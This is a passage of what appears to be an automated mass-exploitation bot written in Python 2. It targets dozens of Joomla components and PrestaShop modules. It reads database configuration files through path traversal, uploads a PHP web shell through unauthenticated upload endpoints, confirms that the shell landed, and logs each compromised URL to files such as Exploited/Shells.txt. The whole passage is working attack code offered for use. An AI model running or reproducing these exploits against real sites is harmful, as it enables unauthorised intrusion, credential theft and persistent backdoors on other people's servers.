		else:
			print '\033[92m[>] \033[0mExploit Com_Joomanager  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


		#42 wddownload
		
		rcayrxdaCaaxcrevlib = requests.get(url+"/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php")
				
		if 'JConfig' in rcayrxdaCaaxcrevlib.content:
			print '\033[92m[>] \033[0mExploit Wddownload  \033[92m[Done] '.format(sn)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Wddownload  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
		
			
			
		#43 com_macgallery
		
		zrcayrxdaCaaxcrevlib = requests.get(url+"/index.php?option=com_macgallery&view=download&albumid=../../configuration.php")
				
		if 'JConfig' in zrcayrxdaCaaxcrevlib.content:
			print '\033[92m[>] \033[0mExploit Com_Macgallery  \033[92m[Done] '.format(sn)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/index.php?option=com_macgallery&view=download&albumid=../../configuration.php'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Com_Macgallery  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
		

		
		#44 com_jdownloads
	
			filename1 = "up.php3.g"
			
			
			com_jd_up = { 'file_upload':(filename1, shell, 'text/html'), 'pic_upload':(filename1, shell, 'text/html')}

			com_jd_dat = { 'name': 'yc-waif', 'mail': 'spinningarrix@gmail.com', 'catlist': '1', 'filetitle': "lolz",
					 'description': "<p>hacked</p>" , '2d1a8f3bd0b5cf542e9312d74fc9766f': 1, 'send': 1, 'senden': "Send file",
					 'description': "<p>newsking</p>", 'option': "com_jdownloads", 'view': "upload" }
			
			
			req_jd = requests.post(url+'/index.php?option=com_jdownloads&Itemid=0&view=upload', data=com_jd_dat, files=com_jd_up)
			
			
			shell_jd = requests.get(url+'/images/jdownloads/screenshots/up.php3.g')
		
			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in shell_jd.content:
				
				print '\033[92m[>] \033[0mExploit com_jdownloads  \033[92m[Done] '.format(sn)
				open('Exploited/Shells.txt', 'a').write(url+'/images/jdownloads/screenshots/up.php3.g'+'\n')
				
			else:
				print '\033[92m[>] \033[0mExploit com_jdownloads  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
		
	
		#45 com_jbcatalog
			
			
			check_jbcatalog = requests.get(url+'/components/com_jbcatalog/libraries/jsupload/')

			if 'jQuery File' in check_jbcatalog.content:
			
				print '\033[92m[>] \033[0mExploit Com_Jbcatalog  \033[92m[Done] '.format(sn)
				
				com_jbcatalog = {'files[]':(filename, shell, 'text/html')}
				
				
				req_jbcatalog = requests.post(url+'/components/com_jbcatalog/libraries/jsupload/server/php/', files=com_jbcatalog)
				
				
				Shell_jbcatalog = requests.get(url+'/com_jbcatalog/libraries/jsupload/server/php/files/'+str(filename))
				
				if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Shell_jbcatalog.content:
					print '\033[92m[>] \033[0mExploit Com_Jbcatalog  \033[92m[Done] '.format(sn)
					open('Exploited/Shells.txt', 'a').write(url+'/com_jbcatalog/libraries/jsupload/server/php/files/'+str(filename)+'\n')
					
			else:
				print '\033[92m[>] \033[0mExploit Com_Jbcatalog  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
				
	
		#46 com_fabrik

		
		
	    #47 com_b2jcontact2
		
			vuln_url = url+'/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&qqfile=/../../../'+filename
			
			req_b2j = requests.post(vuln_url, data=shell)
			
			
			check_lib = requests.get(url+'/components/'+filename)
			
			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in check_lib.content:			
				print '\033[92m[>] \033[0mExploit Com_B2j2  \033[92m[Done] '.format(sn)
				open('Exploited/Shells.txt', 'a').write(url+'/components/'+filename+'\n')
						
						
			else:
				print '\033[92m[>] \033[0mExploit Com_B2j2  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
						
		#48 CoM_adsmanager2
		
			check_adsm = requests.get(url+'/index.php?option=com_adsmanager&task=upload&tmpl=component')
			
			if '{"jsonrpc" : "2.0",' in check_adsm.content:
			
				print '\033[92m[>] \033[0mExploit Com_Adsmanager2  \033[92m[Done] '.format(sn)
				
				
				imageshell = "Files/shell.jpg"
				
				com_adsm = {'file':(imageshell, shell), 'name':filename}
				
				
				req_adsm = requests.post(url+'/index.php?option=com_adsmanager&task=upload&tmpl=component', data=com_adsm)
				
				check_shell = requests.get(url+"/tmp/plupload/"+filename)
				
				if 'MisterSpyShellForV7Bot0X_istanbul_2019' in check_shell.content:
				
					print '\033[92m[>] \033[0mExploit Com_Adsmanager2  \033[92m[Done] '.format(sn)
					open('Exploited/Shells.txt', 'a').write(url+"/tmp/plupload/"+filename+'\n')
				
				else:
					print '\033[92m[>] \033[0mExploit Com_Adsmanager2  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			else:		
				print '\033[92m[>] \033[0mExploit Com_Adsmanager2  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
		#49 com_myblog

			check_myblog = requests.get(url+'/index.php?option=com_myblog&task=ajaxupload')
			
			if "{error: 'No file" in check_myblog.content:
			
				print '\033[92m[>] \033[0mExploit Com_Myblog  \033[92m[Done] '.format(sn)
				
				image_myblog = "Files/shell.php.xxxjpg"
				
				com_myb = {'fileToUpload':(image_myblog, shell)}
				
				req_myblog = requests.post(url+'/index.php?option=com_myblog&task=ajaxupload', files=com_myb)
				
				shell_path = re.findall("source: '(.*?)'",req_myblog.content)
				
				
				site = shell_path[0]
				
			
				check_shell = requests.get(site)
				
				
				if 'MisterSpyShellForV7Bot0X_istanbul_2019' in check_shell.content:
					print '\033[92m[>] \033[0mExploit Com_Myblog  \033[92m[Done] '.format(sn)
					open('Exploited/Shells.txt', 'a').write(site+'\n')
					
				else:
					print '\033[92m[>] \033[0mExploit Com_Myblog  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
					
				
			else:
				print '\033[92m[>] \033[0mExploit Com_Myblog  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
	
		
			
		#51 com_agora 
			
		zxdawGravkreq = requests.post(url+'/index.php?option=com_agora&task=upload?name=Vuln.php', data=shell)
		
		zxdawGravklib = requests.get(url+'/components/com_agora/img/members/0/Vuln.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zxdawGravklib.content:
			print '\033[92m[>] \033[0mExploit Com Agora  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/components/com_agora/img/members/0/Vuln.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com Agora  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
		#52 com mtree 2.1.5 uploader 
			
		zxdawGravkreq = requests.post(url+'/components/com_mtree/upload.php?name=Vuln.php', data=shell)
		
		zxdawGravklib = requests.get(url+'/components/com_mtree/img/listings/o/Vuln.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zxdawGravklib.content:
			print '\033[92m[>] \033[0mExploit Com_Mtree  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/components/com_agora/img/members/0/Vuln.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Mtree  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		#53 mod_artuploader
			
		zxdawGravkreq = requests.post(url+'/modules/mod_artuploader/upload.php?name=Vuln.php', data=shell)
		
		zxdawGravklib = requests.get(url+'/modules/mod_artuploader/Vuln.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zxdawGravklib.content:
			print '\033[92m[>] \033[0mExploit Mod_Artuploader  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/components/com_agora/img/members/0/Vuln.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Mod_Artuploader  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		#54 com_simplephotogallery
			
		zxdawGravkreq = requests.post(url+'/administrator/components/com_simplephotogallery/lib/uploadFile.php?name=Vuln.php', data=shell)
		
		zxdawGravklib = requests.get(url+'/Vuln.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zxdawGravklib.content:
			print '\033[92m[>] \033[0mExploit Com_Simplephotogallery  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/Vuln.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Simplephotogallery  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
		#55 comsexycontactform
			
		bReflexup = {'uploadfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/com_sexycontactform/fileupload/index.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/com_sexycontactform/fileupload/files/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Com_Sexycontactform  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/mod_socialpinboard_menu/images/socialpinboard/temp/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_Sexycontactform  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	

		#56 com_myblog
			
		bReflexup = {'uploadfile' : open(imagess, 'rb')}
		
		bReflexreq = requests.post(url+'/index.php?option=com_myblog&task=ajaxupload', files=bReflexup)
		
		bReflexlib = requests.get(url+'/pwn.gif')
		
		
		if 'D9ABB613B8D911E3AB27A52B5ED2F278' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Com_myblog pic  \033[92m[Done] '.format(sn)
			open('Exploited/index.txt', 'a').write(url+'/pwn.gif'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Com_myblog pic \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	

		#57 com_rokdownloads
			
		bReflexup = {'uploadfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/administrator/components/com_rokdownloads/assets/uploadhandler.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/images/stories/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit com_rokdownloads  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/images/stories/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit com_rokdownloads  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


		#58 comediaindex
			



		#59 NovaSFH
			
		bReflexup = {'uploadfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/administrator/index.php?option=com_novasfh&c=uploader', files=bReflexup)
		
		bReflexlib = requests.get(url+'/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit NovaSFH  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit NovaSFH  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		#60 com_collector
			
		bReflexup = {'uploadfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/index.php?option=com_collector&view=filelist&tmpl=component&folder=&type=1', files=bReflexup)
		
		bReflexlib = requests.get(url+'/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit com_collector  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit com_collector  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		#61 com_osproperty
			
		bReflexup = {'uploadfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/osproperty/?task=agent_register', files=bReflexup)
		
		bReflexlib = requests.get(url+'/images/osproperty/agent/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit osproperty  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/images/osproperty/agent/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit osproperty  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		#62 com_ksadvertiser
			
		bReflexup = {'uploadfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/index.php?option=com_ksadvertiser&Itemid=36&task=add&catid=0&lang=en', files=bReflexup)
		
		bReflexlib = requests.get(url+'/images/ksadvertiser/U0/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit com_ksadvertiser  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/images/ksadvertiser/U0/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit com_ksadvertiser  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


		#63 com_hwdvideoshare
			
		bReflexup = {'uploadfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/com_hwdvideoshare/assets/uploads/flash/flash_upload.php?jqUploader=1', files=bReflexup)
		
		bReflexlib = requests.get(url+'/tmp/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit com_hwdvideoshare  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/tmp/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit com_hwdvideoshare  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		#64 mod_jfancy
			
		bReflexup = {'uploadfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/mod_jfancy/script.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/images/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit mod_jfancy  \033[92m[Done] '.format(sn)
			open('Exploited/Shells.txt', 'a').write(url+'/images/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit mod_jfancy  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)


    except:
        pass
		
		
		
		
######################################### Prestashop ######################################

def prestashop(url):


	
    try:


		#1 Columnadverts
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/columnadverts/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/columnadverts/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Columnadverts    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/columnadverts/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Columnadverts    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		#2 Vtemslideshow
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/vtemslideshow/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/vtemslideshow/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Vtemslideshow    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/vtemslideshow/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Vtemslideshow    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 3 Realty
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/realty/include/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/realty/include/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Realty    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/realty/include/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Realty    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 4 evogallery
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/realty/evogallery/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/realty/evogallery/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit evogallery    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/realty/evogallery/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit evogallery    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 5 evogallery2
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/realty/evogallery2/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/realty/evogallery2/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Evogallery2    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/realty/evogallery2/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Evogallery2    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 6 resaleform
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/resaleform/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/filesupload/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Resaleform    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/filesupload/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Resaleform    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 7 megaproduct
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/megaproduct/', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/megaproduct/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Megaproduct    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/megaproduct/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Megaproduct    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 8 soopamobile
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/soopamobile/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/soopamobile/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Soopamobile    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/soopamobile/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Soopamobile    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 9 soopamobile2
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/soopamobile2/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/soopamobile2/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Soopamobile2    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/soopamobile2/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Soopamobile2    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 10 soopamobile3
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/soopamobile2/uploadproduct.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/soopamobile2/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Soopamobile3    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/soopamobile2/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Soopamobile3    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 11 soopabanners
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/soopabanners/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/soopabanners/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Soopabanners    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/soopabanners/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Soopabanners    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 12 vtermslideshow
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/vtermslideshow/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/vtermslideshow/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Vtermslideshow    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/vtermslideshow/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Vtermslideshow    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 13 simpleslideshow
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/simpleslideshow/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/simpleslideshow/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Simpleslideshow    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/simpleslideshow/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Simpleslideshow    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 14 productpageadverts
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/productpageadverts/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/productpageadverts/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Product Pageadverts    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/productpageadverts/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Product Pageadverts    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 15 homepageadvertise
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/homepageadvertise/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/homepageadvertise/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Homepageadvertise    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/homepageadvertise/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Homepageadvertise    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 16 homepageadvertise2
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/homepageadvertise2/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/homepageadvertise2/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Homepageadvertise2    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/homepageadvertise2/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Homepageadvertise2    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 17 Columnadverts2
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/columnadverts2/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/columnadverts2/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Columnadverts2    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/columnadverts2/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Columnadverts2    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 18 filesupload
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/filesupload/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/filesupload/uploads/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Filesupload    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/filesupload/uploads/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Filesupload    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 19 Homepageadvertise
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/jro_homepageadvertise/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/jro_homepageadvertise/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Jro Homepageadvertise    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/jro_homepageadvertise/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Jro Homepageadvertise    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 20 Homepageadvertise2
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/jro_homepageadvertise2/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/jro_homepageadvertise2/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Jro Homepageadvertise2    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/jro_homepageadvertise2/slides/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Jro Homepageadvertise2    \033[91m[Failed]  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 21 leosliderlayer
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/leosliderlayer/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/leosliderlayer/slides/up.php')
		
		
		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
			print '\033[92m[>] \033[0mExploit Leosliderlayer    \033[92m[Done]  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/modules/leosliderlayer/slides/up.php'+'\n')
			sys.exit()
		else:
